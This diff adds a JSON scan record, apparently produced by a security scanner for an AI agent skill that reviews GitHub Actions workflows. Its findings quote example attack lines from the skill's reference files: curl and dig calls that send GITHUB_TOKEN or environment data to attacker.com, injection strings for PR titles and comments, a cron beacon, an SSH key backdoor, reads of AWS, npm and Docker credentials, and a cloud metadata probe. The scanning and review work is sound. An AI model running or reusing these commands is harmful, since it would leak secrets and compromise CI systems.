@@ -1,0 +1,345 @@
+{
+  "id": "sickn33__agentic-awesome-skills__plugins~agentic-awesome-skills-claude~skills~gha-security-review",
+  "owner": "sickn33",
+  "repo": "agentic-awesome-skills",
+  "path": "plugins/agentic-awesome-skills-claude/skills/gha-security-review",
+  "name": "gha-security-review",
+  "description": "Review GitHub Actions workflows for exploitable vulnerabilities with concrete attack paths and harmless proof-of-concept sketches. Require explicit authorization for active testing.",
+  "stars": 49315,
+  "category": "coding",
+  "commit": "828257c3037dc7c3c3ec987decc5a603025a0ce5",
+  "contentHash": "af070929a307a8b16235fb671b32e6571ed3087da3c6f399ef4f742b98e0955d",
+  "repoCreatedAt": "2026-01-14T17:48:09Z",
+  "alsoFoundIn": [],
+  "status": "ok",
+  "incomplete": false,
+  "scannedAt": "2026-11-07T16:26:42.053Z",
+  "scan": {
+    "findings": [
+      {
+        "ruleId": "network",
+        "file": "plugins/agentic-awesome-skills-claude/skills/gha-security-review/references/ai-prompt-injection-via-ci.md",
+        "line": 72,
+        "excerpt": "@curl -sSfL https://attacker.com/exfil?key=$(ANTHROPIC_API_KEY) > /dev/null 2>&1",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "attacker.com"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "plugins/agentic-awesome-skills-claude/skills/gha-security-review/references/comment-triggered-commands.md",
+        "line": 71,
+        "excerpt": "/greet\"; curl https://attacker.com/$(env | base64) #",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "attacker.com"
+        ]
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "plugins/agentic-awesome-skills-claude/skills/gha-security-review/references/credential-escalation.md",
+        "line": 192,
+        "excerpt": "curl -d \"token=$GITHUB_TOKEN\" https://attacker.com/collect",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "plugins/agentic-awesome-skills-claude/skills/gha-security-review/references/credential-escalation.md",
+        "line": 192,
+        "excerpt": "curl -d \"token=$GITHUB_TOKEN\" https://attacker.com/collect",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "attacker.com"
+        ]
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "plugins/agentic-awesome-skills-claude/skills/gha-security-review/references/credential-escalation.md",
+        "line": 195,
+        "excerpt": "dig $(echo $GITHUB_TOKEN | base64).attacker.com",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "plugins/agentic-awesome-skills-claude/skills/gha-security-review/references/credential-escalation.md",
+        "line": 198,
+        "excerpt": "echo $SECRET_VALUE  # GitHub masks known secrets, but derived values may leak",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "plugins/agentic-awesome-skills-claude/skills/gha-security-review/references/credential-escalation.md",
+        "line": 201,
+        "excerpt": "echo $GITHUB_TOKEN > token.txt",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "plugins/agentic-awesome-skills-claude/skills/gha-security-review/references/expression-injection.md",
+        "line": 20,
+        "excerpt": "\"; curl https://attacker.com/$(cat $GITHUB_TOKEN) #",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "plugins/agentic-awesome-skills-claude/skills/gha-security-review/references/expression-injection.md",
+        "line": 20,
+        "excerpt": "\"; curl https://attacker.com/$(cat $GITHUB_TOKEN) #",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "attacker.com"
+        ]
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "plugins/agentic-awesome-skills-claude/skills/gha-security-review/references/expression-injection.md",
+        "line": 25,
+        "excerpt": "echo \"PR Title: \"; curl https://attacker.com/$(cat $GITHUB_TOKEN) #\"",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "plugins/agentic-awesome-skills-claude/skills/gha-security-review/references/expression-injection.md",
+        "line": 25,
+        "excerpt": "echo \"PR Title: \"; curl https://attacker.com/$(cat $GITHUB_TOKEN) #\"",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "attacker.com"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "plugins/agentic-awesome-skills-claude/skills/gha-security-review/references/expression-injection.md",
+        "line": 72,
+        "excerpt": "The base64 decodes to `curl -sSfL attacker.com/steal`, executed via command substitution in the filename.",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "shell",
+        "file": "plugins/agentic-awesome-skills-claude/skills/gha-security-review/references/expression-injection.md",
+        "line": 160,
+        "excerpt": "For direct shell interpolation, pass expressions through environment variables and quote their use. This does not protect a later `eval`, `bash -c` constructed ",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "plugins/agentic-awesome-skills-claude/skills/gha-security-review/references/pwn-request.md",
+        "line": 50,
+        "excerpt": "`curl -s -H \"Authorization: Bearer $GITHUB_TOKEN\" \\",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "plugins/agentic-awesome-skills-claude/skills/gha-security-review/references/pwn-request.md",
+        "line": 50,
+        "excerpt": "`curl -s -H \"Authorization: Bearer $GITHUB_TOKEN\" \\",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "plugins/agentic-awesome-skills-claude/skills/gha-security-review/references/pwn-request.md",
+        "line": 51,
+        "excerpt": "-d \"token=$GITHUB_TOKEN&repo=$GITHUB_REPOSITORY\" \\",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "plugins/agentic-awesome-skills-claude/skills/gha-security-review/references/pwn-request.md",
+        "line": 79,
+        "excerpt": "os.system(f\"curl -d token=$GITHUB_TOKEN https://attacker.com/collect\")",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "plugins/agentic-awesome-skills-claude/skills/gha-security-review/references/pwn-request.md",
+        "line": 79,
+        "excerpt": "os.system(f\"curl -d token=$GITHUB_TOKEN https://attacker.com/collect\")",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "attacker.com"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "plugins/agentic-awesome-skills-claude/skills/gha-security-review/references/pwn-request.md",
+        "line": 79,
+        "excerpt": "os.system(f\"curl -d token=$GITHUB_TOKEN https://attacker.com/collect\")",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "plugins/agentic-awesome-skills-claude/skills/gha-security-review/references/real-world-attacks.md",
+        "line": 50,
+        "excerpt": "`curl -s -H \"Authorization: Bearer $GITHUB_TOKEN\" \\",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "plugins/agentic-awesome-skills-claude/skills/gha-security-review/references/real-world-attacks.md",
+        "line": 50,
+        "excerpt": "`curl -s -H \"Authorization: Bearer $GITHUB_TOKEN\" \\",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "plugins/agentic-awesome-skills-claude/skills/gha-security-review/references/real-world-attacks.md",
+        "line": 51,
+        "excerpt": "-d \"token=$GITHUB_TOKEN&repo=$GITHUB_REPOSITORY\" \\",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "plugins/agentic-awesome-skills-claude/skills/gha-security-review/references/runner-infrastructure.md",
+        "line": 34,
+        "excerpt": "echo '* * * * * curl https://attacker.com/beacon' >> /var/spool/cron/crontabs/runner",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "attacker.com"
+        ]
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "plugins/agentic-awesome-skills-claude/skills/gha-security-review/references/runner-infrastructure.md",
+        "line": 37,
+        "excerpt": "mkdir -p ~/.ssh",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "writes-outside",
+        "file": "plugins/agentic-awesome-skills-claude/skills/gha-security-review/references/runner-infrastructure.md",
+        "line": 37,
+        "excerpt": "mkdir -p ~/.ssh",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "plugins/agentic-awesome-skills-claude/skills/gha-security-review/references/runner-infrastructure.md",
+        "line": 38,
+        "excerpt": "echo \"attacker-public-key\" >> ~/.ssh/authorized_keys",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "writes-outside",
+        "file": "plugins/agentic-awesome-skills-claude/skills/gha-security-review/references/runner-infrastructure.md",
+        "line": 38,
+        "excerpt": "echo \"attacker-public-key\" >> ~/.ssh/authorized_keys",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "plugins/agentic-awesome-skills-claude/skills/gha-security-review/references/runner-infrastructure.md",
+        "line": 41,
+        "excerpt": "cat ~/.docker/config.json  # Docker registry credentials",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "plugins/agentic-awesome-skills-claude/skills/gha-security-review/references/runner-infrastructure.md",
+        "line": 42,
+        "excerpt": "cat ~/.npmrc               # npm tokens",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "plugins/agentic-awesome-skills-claude/skills/gha-security-review/references/runner-infrastructure.md",
+        "line": 43,
+        "excerpt": "cat ~/.aws/credentials     # AWS credentials from previous deployments",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "plugins/agentic-awesome-skills-claude/skills/gha-security-review/references/runner-infrastructure.md",
+        "line": 50,
+        "excerpt": "nohup bash -c 'while true; do",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "plugins/agentic-awesome-skills-claude/skills/gha-security-review/references/runner-infrastructure.md",
+        "line": 52,
+        "excerpt": "curl -d @/home/runner/work/*/secrets.env https://attacker.com/collect",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "attacker.com"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "plugins/agentic-awesome-skills-claude/skills/gha-security-review/references/runner-infrastructure.md",
+        "line": 68,
+        "excerpt": "curl http://internal-api.corp.example.com/admin",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "internal-api.corp.example.com"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "plugins/agentic-awesome-skills-claude/skills/gha-security-review/references/runner-infrastructure.md",
+        "line": 70,
+        "excerpt": "curl http://169.254.169.254/latest/meta-data/  # Cloud metadata (example of attack vector)",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "169.254.169.254"
+        ]
+      }
+    ],
+    "findingTotals": {
+      "network": 13,
+      "reads-secrets": 16,
+      "shell": 3,
+      "writes-outside": 2
+    },
+    "score": 77,
+    "band": "review",
+    "rulesVersion": "1.2.0",
+    "filesScanned": 13,
+    "filesSkipped": 0
+  },
+  "history": [
+    {
+      "commit": "828257c3037dc7c3c3ec987decc5a603025a0ce5",
+      "scannedAt": "2026-11-07T16:26:42.053Z",
+      "score": 77,
+      "rulesVersion": "1.2.0"
+    }
+  ]
+}
